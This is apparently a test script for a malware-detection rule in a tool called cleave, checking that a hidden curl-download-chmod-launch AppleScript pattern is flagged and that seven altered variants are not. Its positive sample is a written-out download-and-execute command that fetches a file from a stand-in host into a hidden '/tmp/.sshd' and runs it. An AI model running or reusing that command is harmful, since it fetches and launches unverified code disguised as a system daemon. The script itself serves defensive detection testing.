#!/usr/bin/env python3
"""Exercise the hidden temporary download-and-launch chain."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

root = Path(__file__).resolve().parents[2]
cleave = os.environ.get('CLEAVE', str(root.parent / 'cleave/target/release/cleave'))
positive = 'do shell script "curl -skL https://example.invalid/a -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"\n'
cases = {
    'positive': positive,
    'no-launch': positive.replace(' && /tmp/.sshd &', ''),
    'no-chmod': positive.replace(' && chmod +x /tmp/.sshd', ''),
    'visible-path': positive.replace('/tmp/.sshd', '/tmp/sshd'),
    'no-shell-call': positive.replace('do shell script ', ''),
    'no-download': positive.replace('curl -skL', 'printf '),
    'ordinary-name': positive.replace('/tmp/.sshd', '/tmp/.task'),
    'tls-verified': positive.replace('-skL', '-sL'),
}
with tempfile.TemporaryDirectory() as directory:
    paths = []
    for name, data in cases.items():
        path = Path(directory) / (name + '.applescript')
        path.write_text(data)
        paths.append(str(path))
    result = subprocess.run([cleave, '--traits-dir', str(root), '--json', *paths],
                            capture_output=True, text=True, check=True,
                            env={**os.environ, 'CLEAVE_SKIP_CACHE': '1'})
    for line in result.stdout.split('\n'):
        if not line:
            continue
        f = json.loads(line)['files'][0]
        match = any(t['id'].endswith('::applescript-hidden-curl-chmod-launch') for t in f.get('traits', []))
        assert match == f['path'].endswith('/positive.applescript'), f['path']
print('Hidden curl launch finding rejects seven negative controls')
